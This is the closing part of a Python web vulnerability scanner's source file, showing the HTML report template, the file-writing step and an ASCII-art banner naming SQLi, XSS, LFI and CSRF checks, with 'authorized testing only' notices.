  .stat-label{{font-size:12px;letter-spacing:1px;color:#8b92a5;margin-top:4px}}
  main{{padding:40px 60px}}
  h2{{font-size:20px;font-weight:700;color:#fff;margin-bottom:20px;letter-spacing:1px;text-transform:uppercase}}
  table{{width:100%;border-collapse:collapse;background:var(--surface);border-radius:12px;overflow:hidden}}
  th{{background:rgba(0,245,212,.06);color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:2px;text-transform:uppercase;padding:14px 16px;text-align:left;border-bottom:1px solid var(--border)}}
  td{{padding:14px 16px;border-bottom:1px solid rgba(255,255,255,.04);font-size:14px;vertical-align:top}}
  tr:last-child td{{border-bottom:none}}
  tr:hover td{{background:rgba(255,255,255,.02)}}
  .badge{{display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;letter-spacing:1px;font-family:'JetBrains Mono',monospace;color:#fff}}
  .url{{font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all;color:#8b92a5}}
  .evidence{{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--yellow)}}
  .no-findings{{text-align:center;padding:60px;color:#8b92a5}}
  .footer{{text-align:center;padding:30px;color:#8b92a5;font-size:13px;border-top:1px solid var(--border);margin-top:40px}}
</style>
</head>
<body>
<div class="scan-header">
  <div class="logo">// ADVANCED WEB VULNERABILITY SCANNER v2.0</div>
  <h1>Security Assessment Report</h1>
  <div class="meta">Target: <span>{target}</span> &nbsp;|&nbsp; Generated: <span>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</span></div>
  <div class="stats">
    <div class="stat-card"><div class="stat-num" style="color:#fff">{len(findings)}</div><div class="stat-label">TOTAL</div></div>
    <div class="stat-card"><div class="stat-num" style="color:{sev_colors['CRITICAL']}">{sev_count['CRITICAL']}</div><div class="stat-label">CRITICAL</div></div>
    <div class="stat-card"><div class="stat-num" style="color:{sev_colors['HIGH']}">{sev_count['HIGH']}</div><div class="stat-label">HIGH</div></div>
    <div class="stat-card"><div class="stat-num" style="color:{sev_colors['MEDIUM']}">{sev_count['MEDIUM']}</div><div class="stat-label">MEDIUM</div></div>
    <div class="stat-card"><div class="stat-num" style="color:{sev_colors['LOW']}">{sev_count['LOW']}</div><div class="stat-label">LOW</div></div>
  </div>
</div>
<main>
  <h2>Vulnerability Findings</h2>
  {'<table><thead><tr><th>#</th><th>Severity</th><th>Vulnerability</th><th>URL</th><th>Details</th><th>Evidence</th></tr></thead><tbody>' + rows + '</tbody></table>' if findings else '<div class="no-findings">&#10003; No vulnerabilities detected</div>'}
</main>
<div class="footer">Generated by Advanced Web Vulnerability Scanner v2.0 &nbsp;|&nbsp; For authorized testing only</div>
</body>
</html>"""

    with open(fname, 'w', encoding='utf-8') as f:
        f.write(html)
    return fname


# --- BANNER -----------------------------------------------
def banner():
    art = f"""
{C.CYAN}{C.BOLD}
  +==============================================================+
  |   ##+   ##+##+   ##+##+     ###+   ##+  #######+ ######+   |
  |   ##|   ##|##|   ##|##|     ####+  ##|  ##+====+##+====+   |
  |   ##|   ##|##|   ##|##|     ##+##+ ##|  #######+##|        |
  |   +##+ ##++##|   ##|##|     ##|+##+##|  +====##|##|        |
  |    +####++ +######++#######+##| +####|  #######|+######+   |
  |     +===+   +=====+ +======++=+  +===+  +======+ +=====+  |
  |                                                              |
  |          Advanced Web Vulnerability Scanner  v2.0            |
  |          SQLi | XSS | LFI | CSRF | Auth | Headers           |
  +==============================================================+{C.RESET}
  {C.DIM}For authorized penetration testing and bug bounty only.{C.RESET}"""
    try:
        print(art)
    except UnicodeEncodeError:
        print("\n  Advanced Web Vulnerability Scanner v2.0")
        print("  SQLi | XSS | LFI | CSRF | Auth | Headers\n")



# Scanner core ready - imported by app.py and CLI
